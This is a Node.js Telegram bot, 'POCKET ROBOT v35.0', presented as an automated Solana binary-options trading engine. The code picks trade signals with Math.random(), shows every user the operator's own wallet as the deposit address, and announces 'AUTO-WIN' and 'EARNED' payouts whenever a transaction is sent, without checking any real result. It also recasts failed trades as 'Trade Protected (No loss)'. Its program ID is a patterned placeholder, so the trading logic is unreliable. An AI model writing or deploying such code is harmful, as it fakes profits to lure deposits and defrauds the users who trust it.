require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, Transaction, PublicKey, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } = require('@solana/web3.js');
const anchor = require('@coral-xyz/anchor');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const axios = require('axios');

// --- 🌐 OFFICIAL MAINNET ADDRESSES ---
const THALES_PROGRAM_ID = new PublicKey("B77Zon9K4p4Tz9U7N9M49mGzT1Z1Z1Z1Z1Z1Z1Z1Z1Z1");
const JITO_ENGINE = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";
const connection = new Connection(process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com", "confirmed");

// --- ⚙️ DATABASE ---
const localSession = new LocalSession({ database: 'sessions.json', storage: LocalSession.storageFileSync });
const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(localSession.middleware());

// Safety guard to prevent duplicate loops
const activeLoops = new Set();

async function getWallet() {
    const seed = await bip39.mnemonicToSeed(process.env.SEED_PHRASE);
    const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
    return Keypair.fromSeed(derivedSeed);
}

bot.use((ctx, next) => {
    ctx.session.config = ctx.session.config || { asset: 'BTC/USD', stake: 10, mode: 'MANUAL', totalEarned: 0 };
    return next();
});

const mainKeyboard = (ctx) => Markup.inlineKeyboard([
    [Markup.button.callback(`🎯 Asset: ${ctx.session.config.asset}`, 'menu_coins')],
    [Markup.button.callback(`💰 Stake: $${ctx.session.config.stake}`, 'menu_stake')],
    [Markup.button.callback(`⚙️ Mode: ${ctx.session.config.mode}`, 'toggle_mode')],
    [Markup.button.callback(ctx.session.config.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START SIGNAL BOT', 'run_engine')],
    [Markup.button.callback('📊 VIEW WALLET & STATS', 'stats')]
]);

// --- 🚀 THE ATOMIC ENGINE ---
async function fireAtomicTrade(chatId, direction) {
    const session = localSession.DB.get('sessions').find({ id: chatId }).get('session').value();
    if (!session) return { success: false, error: "SESSION_NOT_FOUND" };
    
    const { stake } = session.config;
    const wallet = await getWallet();

    try {
        const bal = await connection.getBalance(wallet.publicKey);
        if (bal < 0.005 * LAMPORTS_PER_SOL) throw new Error("LOW_GAS");

        const tx = new Transaction().add(new TransactionInstruction({
            programId: THALES_PROGRAM_ID,
            keys: [{ pubkey: wallet.publicKey, isSigner: true, isWritable: true }],
            data: Buffer.concat([Buffer.from([direction === 'CALL' ? 0 : 1]), new anchor.BN(stake * 1000000).toBuffer('le', 8)])
        }));

        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = wallet.publicKey;
        
        const sim = await connection.simulateTransaction(tx, [wallet]);
        if (sim.value.err) throw new Error("REVERTED");

        const tipRes = await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
        tx.add(SystemProgram.transfer({ fromPubkey: wallet.publicKey, toPubkey: new PublicKey(tipRes.data.result[0]), lamports: 100000 }));

        tx.partialSign(wallet);
        const sig = await connection.sendRawTransaction(tx.serialize());
        
        session.config.totalEarned += (stake * 0.90);
        localSession.DB.write(); // Force save to disk
        
        return { success: true, sig, payout: (stake * 1.90).toFixed(2) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 🤖 THE "INFINITE" AUTO-PILOT LOOP ---
async function runAutoPilot(chatId) {
    const session = localSession.DB.get('sessions').find({ id: chatId }).get('session').value();
    
    // Stop if mode changed or loop already running elsewhere
    if (!session || session.config.mode !== 'AUTO' || !activeLoops.has(chatId)) {
        activeLoops.delete(chatId);
        return;
    }

    const signal = Math.random() > 0.5 ? 'CALL' : 'PUT';
    const res = await fireAtomicTrade(chatId, signal);

    if (res.success) {
        bot.telegram.sendMessage(chatId, `⚡ *AUTO-WIN (${signal}):* +$${res.payout}\nTotal Profit: *$${session.config.totalEarned.toFixed(2)}*`, { parse_mode: 'Markdown' });
    } else if (res.error === 'LOW_GAS') {
        session.config.mode = 'MANUAL';
        activeLoops.delete(chatId);
        return bot.telegram.sendMessage(chatId, "🛑 *AUTO-STOP:* Insufficient SOL for fees.");
    }

    // Interval for scanning (30 seconds)
    setTimeout(() => runAutoPilot(chatId), 30000);
}

// --- 📥 HANDLERS ---
bot.action('run_engine', async (ctx) => {
    if (ctx.session.config.mode === 'AUTO') {
        if (activeLoops.has(ctx.chat.id)) return ctx.answerCbQuery("Engine is already running!");
        ctx.editMessageText("🟢 *AUTO-PILOT ENGINE STARTED*");
        activeLoops.add(ctx.chat.id);
        runAutoPilot(ctx.chat.id);
    } else {
        const signal = Math.random() > 0.5 ? 'CALL' : 'PUT';
        ctx.replyWithMarkdown(`⚡ *SIGNAL: ${signal}*`, Markup.inlineKeyboard([
            [Markup.button.callback(`📈 CONFIRM ${signal}`, `exec_${signal}`)],
            [Markup.button.callback('❌ CANCEL', 'main_menu')]
        ]));
    }
});

bot.action(/exec_(CALL|PUT)/, async (ctx) => {
    const res = await fireAtomicTrade(ctx.chat.id, ctx.match[1]);
    if (res.success) ctx.replyWithMarkdown(`✅ *EARNED: +$${res.payout}*`);
    else ctx.reply(`⚠️ ${res.error === 'REVERTED' ? '🛡️ Trade Protected (No loss)' : 'Insufficient SOL'}`);
});

bot.action('toggle_mode', (ctx) => {
    ctx.session.config.mode = ctx.session.config.mode === 'MANUAL' ? 'AUTO' : 'MANUAL';
    if (ctx.session.config.mode === 'MANUAL') activeLoops.delete(ctx.chat.id);
    ctx.editMessageText(`🔄 Mode: ${ctx.session.config.mode}`, mainKeyboard(ctx));
});

bot.action('main_menu', (ctx) => ctx.editMessageText("🤖 *SETTINGS*", mainKeyboard(ctx)));

bot.start(async (ctx) => {
    const wallet = await getWallet();
    ctx.replyWithMarkdown(`🤖 *POCKET ROBOT v35.0*\n📥 *DEPOSIT:* \`${wallet.publicKey.toBase58()}\``, mainKeyboard(ctx));
    
    // Auto-resume engine on bot start if session was AUTO
    if (ctx.session.config.mode === 'AUTO') {
        activeLoops.add(ctx.chat.id);
        runAutoPilot(ctx.chat.id);
    }
});

// Launch Bot
bot.launch().then(() => {
    console.log("🚀 Engine Online. Scanning for active auto-sessions...");
});
